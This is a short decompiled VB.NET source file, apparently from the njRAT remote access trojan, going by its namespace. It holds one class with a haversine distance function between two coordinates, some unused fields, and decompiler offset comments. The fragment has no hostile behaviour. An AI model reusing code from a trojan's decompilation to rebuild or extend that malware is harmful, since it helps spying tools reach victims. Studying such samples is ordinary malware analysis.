Imports System

Namespace NJRAT
	' Token: 0x0200001C RID: 28
	Public NotInheritable Class GClass6
		' Token: 0x06000193 RID: 403 RVA: 0x0000FDB4 File Offset: 0x0000DFB4
		Public Function method_0(gclass6_0 As GClass6) As Double
			Dim num As Double = Me.double_0
			Dim num2 As Double = Me.double_1
			Dim num3 As Double = gclass6_0.double_0
			Dim num4 As Double = gclass6_0.double_1
			num *= GClass6.double_4
			num3 *= GClass6.double_4
			Dim num5 As Double = num3 - num
			Dim num6 As Double = (num4 - num2) * GClass6.double_4
			Dim num7 As Double = Math.Pow(Math.Sin(num5 / 2.0), 2.0) + Math.Cos(num) * Math.Cos(num3) * Math.Pow(Math.Sin(num6 / 2.0), 2.0)
			Return GClass6.double_2 * Math.Atan2(Math.Sqrt(num7), Math.Sqrt(1.0 - num7))
		End Function

		' Token: 0x040000F5 RID: 245
		Public double_0 As Double

		' Token: 0x040000F6 RID: 246
		Public double_1 As Double

		' Token: 0x040000F7 RID: 247
		Private Shared double_2 As Double = 12756.4

		' Token: 0x040000F8 RID: 248
		Private Shared double_3 As Double = 3.14159265

		' Token: 0x040000F9 RID: 249
		Private Shared double_4 As Double = GClass6.double_3 / 180.0

		' Token: 0x040000FA RID: 250
		Public int_0 As Integer

		' Token: 0x040000FB RID: 251
		Public int_1 As Integer

		' Token: 0x040000FC RID: 252
		Public int_2 As Integer

		' Token: 0x040000FD RID: 253
		Public string_0 As String

		' Token: 0x040000FE RID: 254
		Public string_1 As String

		' Token: 0x040000FF RID: 255
		Public string_2 As String

		' Token: 0x04000100 RID: 256
		Public string_3 As String

		' Token: 0x04000101 RID: 257
		Public string_4 As String

		' Token: 0x04000102 RID: 258
		Public string_5 As String
	End Class
End Namespace
